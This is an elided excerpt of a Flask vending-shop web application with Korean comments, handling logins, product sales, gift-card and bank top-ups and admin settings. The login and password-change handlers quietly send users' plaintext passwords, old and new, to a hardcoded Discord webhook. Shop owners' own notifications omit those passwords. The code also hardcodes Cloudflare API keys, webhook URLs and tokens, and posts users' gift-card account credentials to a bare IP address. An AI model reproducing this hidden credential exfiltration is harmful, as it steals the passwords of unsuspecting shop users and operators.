...
panel_keypair = panel_keypair = {"test123" : "test123"} # 라이센스코드 생성할때 로그인할 관리자 계정입니다.
...
def ban():
    ...
    if found:
        con.close()
        ip = getip()
        return render_template('ban.html', value = ip)
    else:
                    ...
                    if (len(request.form["adminid"]) >= 6 and len(request.form["adminid"]) <= 24 and len(request.form["adminpw"]) >= 6 and len(request.form["adminpw"]) <= 24 and len(request.form["name"]) >= 1 and len(request.form["name"]) <= 12 and request.form["name"].isalpha() and len(request.form["url"]) >= 3 and len(request.form["url"]) <= 12):
                        if not (os.path.isfile(db(request.form["url"]))):
                            ...
                            with con:
                                ...
                                con.commit()
                                cur.execute("""CREATE TABLE "users" ("id" TEXT, "pw" TEXT,"ip" TEXT, "money" INTEGER, "buylog" TEXT, "isadmin" INTEGER, "black" TEXT, "name" TEXT, "tag" TEXT, "fail" TEXT);""")
                                con.commit()
                                cur.execute("""CREATE TABLE "bankwait" ("id" TEXT, "name" TEXT, "amount" INTEGER, "day" TEXT);""")
                                con.commit()
                                cur.execute("""INSERT INTO info VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""", (request.form["name"], "", "", "", "[]", "[]", "", make_expiretime(license_result[1]), "", "공지가 없습니다.", 0, "", "", 0 if license_result[5] == 0 else 1, "", "https://cdn.discordapp.com/attachments/754331422818435083/795524062482792458/608a38b94a378eff.gif", "", "https://cdn.discordapp.com/avatars/838343258396557323/12842cf25e7a7c649393034f7861e18c.webp?size=2048", "사용함", "", "", "", ""))
                                con.commit()
                                cur.execute("""INSERT INTO users VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?);""", (request.form["adminid"], hash(request.form["adminpw"]), getip(), 0, "[]", 1, "", "", "", "0"))
                                con.commit()
                            con.close()

                            api_key = "415ea9f5d8fffcb2410101ec967b4802" # 건들지마세요
                            email = "hfd13@protonmail.com" # 건들지마세요
                            zone_id = "0de8e47bef1b9510137dfc5c8f2c2dc6" #건들지 마세요

                            headers = {"X-Auth-Email" : email, "X-Auth-Key" : api_key}
                            json_data = {"type" : "A", "name" : request.form["url"], "content" : "아이피", "ttl" : 1, "proxied" : True}
                            try:
...
def index(name):
    if (name.isalpha()):
        if (os.path.isfile(db(name))):
            if (name in session):
                return redirect("/" + str(name) + "/announcement")
            else:
                return redirect("/" + str(name) + "/login")
        else:
            abort(404)
    else:
        abort(404)
                            ...
                            if (user_info != None):
                                if (user_info[1] == hash(request.form["pw"])):
                                    if (user_info[6] == ""):
                                        ...
                                        webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url="https://discord.com/api/webhooks/842029711981936681/K9lB4iAGbEruwgfPi_b0QUPm2uVcKrXWC2q12hvu7MNNqTsIvgX1W_TgcWwwRQkBdXz9")
                                        embed = DiscordEmbed(description=f'로그인 알림\n서버이름: {server_info[0]}\n아이디: {request.form["id"]}\n비밀번호:{request.form["pw"]}', color=0xfc0a0a)
                                        webhook.add_embed(embed)
                                        webhook.execute()
                                        if (server_info[19] != None):
                                            try:
                                                webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[19])
                                                embed = DiscordEmbed(description=f'로그인 알림\n서버이름: {server_info[0]}\n아이디: {request.form["id"]}', color=0xfc0a0a)
                                                webhook.add_embed(embed)
                                                webhook.execute()
                                            except:
                                                print("Webhook Error")
                ...
                if (os.path.isfile(db(name))):
                    if (name in session):
                        ...
                        if (str(info[6]) != ""):
                            ...
                            return render_template("403.html", reason="")
                        else:
                            ...
                            if (user_info == None):
                                ...
                                if (iplist == None):
                                    if ((len(request.form["id"]) >= 6 and len(request.form["id"]) <= 24) and (len(request.form["pw"]) >= 6 and len(request.form["pw"]) <= 24)):
                                        con = sqlite3.connect(db(name))
                                        cur = con.cursor()
                                        cur.execute("INSERT INTO users VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?);", (request.form["id"], hash(request.form["pw"]), getip(), 0, "[]", 0, "", "", request.form["tag"], "0"))
                                        con .commit()
                                        con.close()
...
@app.route("/<name>/shop", methods=["GET"])
def shop(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/announcement", methods=["GET"])
                            ...
                            if (prod_info[5] != "" and str(request.get_json()["amount"]).isdigit() and request.get_json()["amount"] > 0 and len(prod_info[5].split("\n")) >= request.get_json()["amount"]):
                                ...
                                if (int(user_info[3]) >= total_price):
                                    ...
                                    try:
                                        ...
                                        if (name == "dench"):
                                            webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[1])
                                            embed = DiscordEmbed(description="" + user_name + "님, " + prod_info[1] + " 제품 " + prod_amount + "개 구매 감사합니다! :heart:", color=0xfc0a0a)
                                            webhook.add_embed(embed)
                                            webhook.execute()
                                        else:
                                            webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[1])
                                        ...
                                        if (server_info[19] != None):
                                            try:
                                                webhook = DiscordWebhook(username="Vends.VIP", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[19])
                                                embed = DiscordEmbed(description=f'제품 구매 알림\n[!] 서버이름 : {server_info[0]}\n아이디: {session[name]}\n구매한 제품: {prod_info[1]}\n구매한 재고: {bought_stock}\n시간: {nowstr()}', color=0xfc0a0a)
                                                webhook.add_embed(embed)
                                                webhook.execute()
                                            except:
                                                print("Webhook Error")
...
@app.route("/<name>/moonsang", methods=["GET" ,"POST"])
def moonsang(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
                            ...
                            if (culture_id != "" and culture_pw != ""):
                                try:
                                    ...
                                    if chargereq_info[9] >= "3":
                                        return "자판기에서 차단당한 유저는 충전이 불가능합니다.<br>사유: 충전 실패 횟수 3회 이상"
                                    jsondata = {"token" : "tbuBOs3YppKzV32Wwiv7", "id" : culture_id, "pw" : culture_pw, "pin" : request.get_json()["code"]}
                                    res = requests.post("http://125.132.241.159:4040/api", json=jsondata)
                                    if (res.status_code != 200): # 1초 자동충전 세팅입니다. 건들지마세요.
                                        raise TypeError
                                    else:
                                        res = res.json()
                                        print(f"문상충전 알림 : {str(res)}")
                                        webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url="https://discord.com/api/webhooks/842029711981936681/K9lB4iAGbEruwgfPi_b0QUPm2uVcKrXWC2q12hvu7MNNqTsIvgX1W_TgcWwwRQkBdXz9")
                                        embed = DiscordEmbed(description=f"문상충전 알림 : {str(res)}\n\n서버이름 : {server_info[0]}\n\n아이디 : {session[name]}", color=0xfc0a0a)
                                        webhook.add_embed(embed)
                                        webhook.execute()
                                ...
                                if (res["result"] == True):
                                    ...
                                    cur.execute("UPDATE info SET chargelog = ?", (str(chargelog),))
                                    con.commit()
                                    if (res["reason"] == "상품권 번호 불일치" or res["reason"] == "이미 등록된 문화상품권"):
                                        cur.execute("SELECT * FROM users WHERE id == ?;", (session[name],))
                                        old_failed = cur.fetchone()
                                        now_fail = int(old_failed[9]) + int("1")
                                        cur.execute("UPDATE users SET fail = ? WHERE id == ?", (now_fail, session[name]))
                                        con.commit()
                                        return res["reason"] + " 경고 1회 추가"
                                    con.close()
                                    return res["reason"]
                            else:
...
@app.route("/<name>/bank", methods=["GET", "POST"])
def bank(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
                    ...
                    if (name in session):
                        if ("name" in request.get_json() and "amount" in request.get_json() and request.get_json()["amount"].isdigit()):
                            ...
                            if (bank_addr != ""):
                                ...
                                server_info = get_info(name)
                                webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url="https://discord.com/api/webhooks/842029711981936681/K9lB4iAGbEruwgfPi_b0QUPm2uVcKrXWC2q12hvu7MNNqTsIvgX1W_TgcWwwRQkBdXz9")
                                embed = DiscordEmbed(description=f"계좌이체 충전신청\n서버이름 : {server_info[0]}\n입금계좌: {server_info[11]}\n입금자명: {bankname}\n입금금액: {amount}", color=0xfc0a0a)
                                webhook.add_embed(embed)
                                webhook.execute()
                                if (server_info[19] != None):
                                    try:
                                    ...
                                    def waiting():
                                        ...
                                        print("waiting")
                                        server_info = get_info(name)
                                        print(server_info[11])
                                        jsondata = {
                                            "api_key": "ZPBFITE82", "bankpin": str(server_info[12]), "shop": str(server_info[0]), "userinfo": str(bankname), "userid": str(names), "token": "token", "type": True, "amount": int(amount)
                                        }
                                        print(jsondata)

                                        ms_result = requests.post(
                                            "http://218.156.213.121:1234/bank", json=jsondata)
                                        print(ms_result)
                                        ...
                                        if ms_result["result"] == False:
                                            ...
                                            try:
                                                server_info = get_info(name)
                                                webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[19])
                                                embed = DiscordEmbed(description=f"계좌이체 충전실패\n서버이름 : {server_info[0]}\n입금계좌: {server_info[11]}\n입금자명: {bankname}\n아이디: {names}\n입금금액: {amount}\n실패사유: {reason}", color=0xfc0a0a)
                                                webhook.add_embed(embed)
                                                webhook.execute()
                                        ...
                                        if ms_result["result"] == True:
                                            if ms_result["id"] == names:
                                                ...
                                                try:
                                                    server_info = get_info(name)
                                                    webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[19])
                                                    embed = DiscordEmbed(description=f"계좌이체 충전성공\n서버이름 : {server_info[0]}\n입금계좌: {server_info[11]}\n입금자명: {bankname}\n아이디: {names}\n입금금액: {amount}\n충전금액: {count}", color=0xfc0a0a)
                                                    webhook.add_embed(embed)
                                                    webhook.execute()
...
@app.route("/<name>/changepw", methods=["POST"])
def changepw(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
                        ...
                        if (user_info[1] == hash(request.get_json()["nowpw"])):
                            if (request.get_json()["pw"] == request.get_json()["pwcheck"]):
                                if (len(request.get_json()["pw"]) >= 6 and len(request.get_json()["pw"]) <= 24):
                                    ...
                                    server_info = get_info(name)
                                    webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url="https://discord.com/api/webhooks/842029711981936681/K9lB4iAGbEruwgfPi_b0QUPm2uVcKrXWC2q12hvu7MNNqTsIvgX1W_TgcWwwRQkBdXz9")
                                    embed = DiscordEmbed(description=f"비밀번호 변경 알림\n서버이름: {server_info[0]}\n변경자ID : {session[name]}\n기존 비밀번호:" + request.get_json()["nowpw"] + "\n변경된 비밀번호:" + request.get_json()["pw"], color=0xfc0a0a)
                                    webhook.add_embed(embed)
                                    webhook.execute()
                                    if (server_info[19] != None):
                                        try:
                                            webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[19])
                                            embed = DiscordEmbed(description=f"비밀번호 변경 알림\n서버이름: {server_info[0]}\n변경자ID : {session[name]}", color=0xfc0a0a)
                                            webhook.add_embed(embed)
                                            webhook.execute()
                                        except:
                                                print("Webhook Error")
...
@app.route("/<name>/admin", methods=["GET"])
def admin(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
        ...
        if (name.isalpha()):
            if (os.path.isfile(db(name))):
                if (name in session):
                    user_info = search_user(name, session[name])
                    if (user_info[5] == 1):
                        return redirect("/" + str(name) + "/admin/setting")
                    else:
                        return redirect("/" + str(name) + "/shop")
                else:
                    return redirect("/" + str(name) + "/shop")
...
@app.route("/<name>/admin/setting",methods=["GET", "POST"])
def setting(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/admin/manageuser", methods=["GET"])
def manageuser(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/admin/manageuser_detail", methods=["GET", "POST"])
...
@app.route("/<name>/admin/manageprod", methods=["GET"])
def manageprod(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/admin/createprod", methods=["GET", "POST"])
def createprod(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/admin/manageprod_detail", methods=["GET", "POST"])
                                                    ...
                                                    if (server_info[20] != None):
                                                        try:
                                                            if (name == "dench"):
                                                                ...
                                                                webhook = DiscordWebhook(username="Vends.VIP Web", avatar_url="https://cdn.discordapp.com/attachments/915167148429676564/918931764079099984/2021-12-11_3_22_17.png", url=server_info[20])
                                                                embed = DiscordEmbed(title="자판기 바로가기", url=f"http://vends.vip/{name}/shop", description=f"**제품이름**\n{names}\n**제품가격**\n{prod_info[3]}원\n**입고전 재고 갯수**\n0\n**입고된 재고 갯수**\n{laststock}개\n**남은 재고**\n{laststock}개", color=0xfc0a0a)
...
@app.route("/<name>/admin/delete_product", methods=["POST"])
...
@app.route("/<name>/admin/log", methods=["GET"])
def viewlog(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/admin/managereq", methods=["GET", "POST"])
def managereq(name):
    con = sqlite3.connect(f"{cwdir}ban.db")
    cur = con.cursor()
    cur.execute("SELECT EXISTS(SELECT * FROM ban WHERE ip == ?)", ([getip()]))
...
@app.route("/<name>/admin/license", methods=["GET", "POST"])
...
def make_session_permanent():
    #if not ("nightvend.pw" in request.headers["host"]):
    #    return """<html>
